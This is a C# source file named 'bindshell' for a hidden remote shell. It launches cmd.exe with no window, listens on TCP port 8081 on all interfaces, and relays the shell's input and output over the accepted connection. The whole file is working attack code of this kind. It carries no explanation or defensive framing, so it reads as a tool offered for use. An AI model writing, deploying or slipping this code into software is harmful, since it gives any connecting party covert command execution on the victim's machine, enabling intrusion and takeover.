using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Text;
namespace bindshell
{
    public static class SocketService
    {
        private static string GetString(this byte[] byts, int nBytes)
        {
            return Encoding.ASCII.GetString(byts, 0, nBytes);
        }
        public static Task CreateOutputTask(this StreamReader Input, NetworkStream nStream, CancellationToken ctoken)
        {
            Task tOutput = new Task(new Action(() =>
            {
                Stream st = Input.BaseStream;
                StreamWriter sw = new StreamWriter(nStream);
                byte[] buff = new byte[64];
                int rSize;
                while (!ctoken.IsCancellationRequested)
                {
                    try
                    {
                        rSize = 0;
                        rSize = st.Read(buff, 0, buff.Length);
                        sw.Write(buff.GetString(rSize));
                        sw.Flush();
                    }
                    catch (Exception) { }
                }                
            }));
            return tOutput;
        }
        public static Task CreateInputTask(this StreamWriter Output, NetworkStream nStream, CancellationToken ctoken)
        {
            Task tInput = new Task(new Action(() =>
            {
                StreamReader sr = new StreamReader(nStream);
                while (!ctoken.IsCancellationRequested)
                {
                    try
                    {
                        Output.WriteLine(sr.ReadLine());
                    }
                    catch (Exception) { }
                }
            }));
            return tInput;
        }
    }
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static CancellationTokenSource CTokenSrc;
        static Process Shell;
        [STAThread]
        static void Main()
        {
            
            Shell = new Process();
            Shell.StartInfo = new ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                FileName = "cmd",
                RedirectStandardError = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true
            };
            CTokenSrc = new CancellationTokenSource();
                        
            Socket Listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Socket client;
            Listener.Bind(new IPEndPoint(IPAddress.Any, 8081));
            Listener.Listen(10);
                        
            client = Listener.Accept();

            Shell.Start();
            using (NetworkStream ns = new NetworkStream(client))
            {
                Shell.StandardOutput.CreateOutputTask(ns, CTokenSrc.Token).Start();
                Shell.StandardError.CreateOutputTask(ns, CTokenSrc.Token).Start();
                Shell.StandardInput.CreateInputTask(ns, CTokenSrc.Token).Start();
                Shell.WaitForExit(); 
                CTokenSrc.Cancel();
            }
            CTokenSrc = null;
            client.Close();
            Listener.Close();
        }        
        
    }
}
